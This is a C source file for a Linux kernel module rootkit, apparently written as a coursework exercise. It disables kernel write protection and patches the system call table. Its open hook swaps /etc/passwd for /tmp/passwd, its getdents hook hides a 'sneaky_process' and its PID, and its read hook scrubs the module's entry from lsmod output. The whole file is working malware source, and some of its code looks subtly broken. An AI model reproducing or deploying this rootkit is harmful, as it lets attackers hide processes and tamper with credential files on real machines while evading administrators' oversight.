#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/syscalls.h>
#include <linux/slab.h>
#include <net/sock.h>

#define BUFFLEN 1024
#define SNEAKY "sneaky_process"
#define PASSWD "/etc/passwd"

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//interpret linux Dirent correctly:
struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};

//Global Variables for insmod: just need PID
static int   pid = -1;
//obtain PID from outer program
module_param(pid, int, 0);



//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff8106f6f0;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff8106f670;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags, mode_t mode);

//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags, mode_t mode)
{
  size_t passwd_size = sizeof(PASSWD)-1;
  char * mychar = (char *) pathname;
  
  if (strncmp(pathname, PASSWD, passwd_size)==0) {
    //printk(KERN_ALERT "These are the same!\n");
    const char * fake = "/tmp/passwd";
    //printk(KERN_ALERT "My original string is:%s!\n", pathname);
    unsigned long result = copy_to_user(mychar, (const void*) fake, sizeof(pathname)+1);
    //printk(KERN_ALERT "My new string is:%s!\n", mychar);
    // printk(KERN_ALERT "My result is:%lu!\n", result);
  }
  
  return original_call(pathname, flags, mode);

}


//READ FUNCTIONS
asmlinkage int (*read_original)(int fd, void *buf, size_t count);

//Define our new sneaky version of the 'read' syscall
asmlinkage int sneaky_read(int fd, void *buf, size_t count)
{
  /*
  char* mem = kmalloc(count, GFP_KERNEL);
  if (mem == NULL) {
    return -ENOMEM;
  }
  //Kernel sys call
  mm_segment_t userspace = get_fs();
  set_fs(KERNEL_DS);
  long numbytes= read_original(fd, mem, count);
  set_fs(userspace);
  */
  
  ssize_t ret = read_original(fd, buf, count);
  //FIND SNEAKY MOD IN LSMOD
  const char * needle = "sneaky_mod          ";
  const char * haystack = (const char *) buf;
  int i, j;
  //checking int
  int check = 0;
  for (i=0; i< count; i++) {
    if (haystack[i] == '\0') {
      //printk(KERN_INFO "KEY!\n");
      check = 1;
      break;
    }
  }
  if (check == 1) {
    char * locale = strstr(haystack, needle);
    if (locale != NULL) {
      for (j = 0; j < 34; j++) {
	*(locale) = '\b';
	locale++;
      }
    }
  }
  return ret;
}


//GETDENTS FUNCTIONS
asmlinkage int (*getdents_original)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
  //printk(KERN_INFO "Sneaky Get DENTS!\n");
  
  //initial Direct structure
  struct linux_dirent *dir;
  //initialize digits
  size_t SNEAKYSIZE = sizeof(SNEAKY)- 1;

  //Process ID as string
  char num[20];
  sprintf(num, "%d", pid);
  
  //cast dirent structure to char * to manipulate byte by byte
  char * mychar = (char *) dirp;
  //allocate memory for count bytes associated with all dirents read for specific file descriptor 
  //we are in kernel space so allocate memory from kernel memory
  char* mem = kmalloc(count, GFP_KERNEL);
  //We ran out of kernel space --> send back correct Kernel Error Macro
  if (mem == NULL) {
    return -ENOMEM;
  }
  
  //save previous address space value for user space
  mm_segment_t userspace = get_fs();
  // pass addresses derived from Kernel Space to our system calls 
  set_fs(KERNEL_DS);
  //syscall
  long numbytes= getdents_original(fd, (struct linux_dirent*) mem, count);
  //ensure addresses are once again only in user space
  set_fs(userspace);

  //iterate through numbytes
  long i, found_block;
  found_block = 0;
  unsigned long result;
  for (i = 0; i < numbytes; i+= dir->d_reclen) {
    dir = (struct linux_dirent *) (mem + i);
    
    //Dirent name matches our executable name --> DO NOT COPY TO USER SPACE
    if((strncmp(dir->d_name, SNEAKY, SNEAKYSIZE) == 0)||(strncmp(dir->d_name, num, sizeof(num)-1)==0)) {
      found_block += dir->d_reclen;
      continue;
    }
    //copy kernel memory to dirent in user space casted as char* 
    if (result = copy_to_user(mychar + (i-found_block), dir,dir->d_reclen)!= 0) {
      //if failure: free our buffer
      kfree(mem);
      //exit
      return -EAGAIN;
    }

  }
  
  //changes numbytes 
  if (numbytes > 0) {
    numbytes = (i - found_block);
  }
  
  kfree(mem);
  return numbytes;
}


//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  // printk(KERN_ALERT "Sneaky module being loaded.\n");
  //printk(KERN_ALERT "Process ID is: %i!\n", pid);
  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  //GetDents swap
  getdents_original = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents;

  //Read swap
  read_original = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;
  
  
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  *(sys_call_table + __NR_open) = (unsigned long)original_call;

  //Restore GetDents
  *(sys_call_table + __NR_getdents) = (unsigned long)getdents_original;

  //Restore read
  *(sys_call_table + __NR_read) = (unsigned long)read_original;

  
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  //printk(KERN_INFO "Cleaning up module.\n");
}  

//allows renaming of cleanup and init functions
module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

